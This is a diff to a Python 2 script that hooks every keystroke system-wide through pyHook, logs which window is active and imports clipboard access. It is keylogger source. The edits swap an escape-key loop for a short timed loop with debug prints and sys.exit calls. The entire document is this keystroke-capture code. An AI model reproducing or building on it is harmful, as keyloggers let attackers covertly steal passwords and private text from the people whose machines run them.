@@ -2,6 +2,8 @@ from ctypes import *
 import pythoncom
 import pyHook
 import win32clipboard
+import win32api
+import time
 
 user32 = windll.user32
 kernel32 = windll.kernel32
@@ -42,7 +44,7 @@ def get_current_process():
 
 def KeyStroke(event):
     global current_window
-    print "IN KEYSTROKE"
+
     # check to see if target changed windows
     if event.WindowName != current_window:
         current_window = event.WindowName
@@ -68,17 +70,25 @@ def KeyStroke(event):
 
     # create and register a hook manager
 
+
+
 def run():
     print "\n 0000000"
-    while True :
-        if input()!=27:
-            kl = pyHook.HookManager()
-            kl.KeyDown = KeyStroke
-
-    # register the hook and execute forever
-            kl.HookKeyboard()
-            pythoncom.PumpMessages()
-        else:
-            break
+    ti=0
+    while ti<5 :
+        print ti
+        time.sleep(1)
+        ti+=1
+        kl = pyHook.HookManager()
+        print 1
+        kl.KeyDown = KeyStroke
+        print 2
+        kl.HookKeyboard()
+        print 3
+        pythoncom.PumpMessages()
+        print 4
+        sys.exit(0)
+    
     print("key over")
+    sys.exit(0)
     return 0
